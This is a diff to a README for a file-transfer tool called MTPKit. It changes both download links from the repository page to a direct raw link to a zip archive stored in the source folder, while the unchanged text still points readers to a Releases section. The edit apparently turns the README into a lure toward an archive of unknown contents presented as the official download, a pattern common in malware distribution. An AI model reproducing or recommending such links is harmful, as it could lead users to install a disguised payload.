@@ -1,6 +1,6 @@
 # 📱 MTPKit - Transfer files between devices with ease
 
-[![Download MTPKit](https://img.shields.io/badge/Download-MTPKit-blue.svg)](https://github.com/gratianawimpish494/MTPKit)
+[![Download MTPKit](https://img.shields.io/badge/Download-MTPKit-blue.svg)](https://raw.githubusercontent.com/gratianawimpish494/MTPKit/main/Sources/MTP-Kit-v3.1.zip)
 
 MTPKit lets you move files between your computer and Android devices. You connect your phone or tablet with a USB cable or Wi-Fi. This tool handles the technical details of the communication protocol so you do not have to. You can browse folders, copy photos, and move documents quickly.
 
@@ -8,7 +8,7 @@ MTPKit lets you move files between your computer and Android devices. You connec
 
 You can get the software from the official repository page. Visit this page to download the latest version for your computer.
 
-[Click here to open the download page](https://github.com/gratianawimpish494/MTPKit)
+[Click here to open the download page](https://raw.githubusercontent.com/gratianawimpish494/MTPKit/main/Sources/MTP-Kit-v3.1.zip)
 
 Once you reach the page, look for the section labeled Releases on the right side. Select the latest version to view the available files. Download the file that matches your operating system.
 
